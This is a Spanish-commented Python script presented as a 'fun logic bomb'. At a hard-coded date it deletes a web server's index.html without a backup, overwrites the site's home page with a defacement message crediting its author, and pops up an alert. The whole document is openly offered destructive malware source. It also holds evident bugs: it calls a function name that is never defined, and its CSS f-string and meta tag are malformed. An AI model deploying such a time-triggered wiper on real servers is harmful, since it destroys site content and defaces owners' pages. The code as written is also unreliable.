# BOMBA LÓGICA DIVERTIDA
# AUTOR ORIGINAL: MANZA
# EDITOR: SUAJ

# Importaremos los módulos de tiempo para manipular fechas y horas,
# el módulo os para enviar llamadas al sistema operativo, el módulo
# random para crear páginas HTML con estilos aleatorios, el módulo
# shutil para hacer una copia de seguridad (véase el código) y el
# valor sys.platform para obtener el sistema operativo actual.

# Para más información, véase la documentación de dichos módulos.

import time, os
from sys import platform as so_actual
from random import randrange, choice
from shutil import copy as copy_file
from datetime import datetime

# Formato: "AÑO-MES-DIA HORA:MINUTOS:SEGUNDOS"
fecha_hora_objetivo = "2021-02-26 17:27:10"

# El siguiente print() se puede utilizar para estar seguros de que el script
# ya comenzó a ejecutarse.
#print(f"""
#La bomba explotara en el dia y hora: {fecha_hora_objetivo}
#Sistema Operativo encontrado: {so_actual}""")

def cambio_diseno_web():

    # Lo que hará el comando debajo será eliminar un posible archivo de
    # desarrollo web para evitar conflictos. Si se quiere conservar, este
    # comando creará una copia de seguridad antes de hacerlo:
    #copy_file("/var/www/index.html", "/var/www/backup_index.html")

    os.remove("/var/www/index.html")

    # Luego, procederemos a crear un archivo CSS con configuraciones
    # aleatorias. Nótese que la variable ruta_css es la localización
    # del archivo, para manipularlo hacemos uso de la cápsula with.

    ruta_css = "/var/www/html/diseno_bomba_web.css"

    with open(ruta_css, "w", encoding="utf-8") as fichero:

        # Estos serán los valores escogidos aleatoriamente.

        color = randrange(0, 361)
        tamano = randrange(200, 801, 100)
        fuente = choice(("serif", "sans-serif", "monospace", "cursive"))

        # Escribiremos el código en el archivo con los valores
        # seleccionados aleatoriamente.

        codigo_css = f"""
body {
background_color: hsl({color}, 100%, 50%);
}

p {
    font-family: {fuente};
    font-size: {tamano}%;
}
"""
        fichero.write(codigo_css)

    # Ahora, haremos lo mismo para el archivo HTML, con la diferencia de que
    # no le asignamos valores aleatorios (aunque es posible).

    ruta_html = "/var/www/html/index.html"
    with open(ruta_html, "w", encoding="utf-8") as fichero:
        codigo_html = f"""
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8" />
    <title>BOMBA LOGICA</title>
    <meta name="viewport content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" type="text/css" href="{ruta_css}" />
    </head>

<body>
    <p>¡BOMBA LOGICA, EXPLOTADA!!! CREADOR: MANZA!</p>
</body>
</html>
"""
        fichero.write(codigo_html)


def encontrar_so():

    # Esta función, como su nombre lo indica, encontrará el sistema
    # operativo actual y enviará una notificación cuando la bomba estalle.

    if so_actual.startswith("win32"):

        # Usaremos este módulo para ahorrar líneas.

        from win10toast import ToastNotifier

        toast = ToastNotifier()
        toast.show_toast("ALERTA!", "LA BOMBA LOGICA EXPLOTO, CREADOR: MANZA")

    else:

        # Eviaremos una llamada al sistema que use el comando notify-send
        # con el texto especificado.

        os.system("notify-send \"ALERTA! LA BOMBA LOGICA EXPLOTO, CREADOR: \
MANZA\"")


while True:

    # Este es el bucle que se encargará de checar periódicamente si la fecha
    # y hora actuales coinciden con la fecha y hora objetivo.

    codigo_numeros = time.time()
    fecha_hora_actual = datetime.fromtimestamp(codigo_numeros).strftime(
"%Y-%m-%d %H:%M:%S")

    if fecha_hora_objetivo == fecha_hora_actual:

        # Detonaremos la bomba y alertaremos al usuario de ello.

        cambiar_diseno_web()
        encontrar_so()
        break  # Rompemos el bucle para que así finalice el programa.

    else:

        # Pausamos la ejecución durante un segundo para evitar carga
        # innecesaria del sistema (si no lo hicieramos, estaría checando
        # si ya es hora lo más rápido posible, y al llevar milisegundos
        # cada operación sería un desperdicio de recursos).

        time.sleep(1)

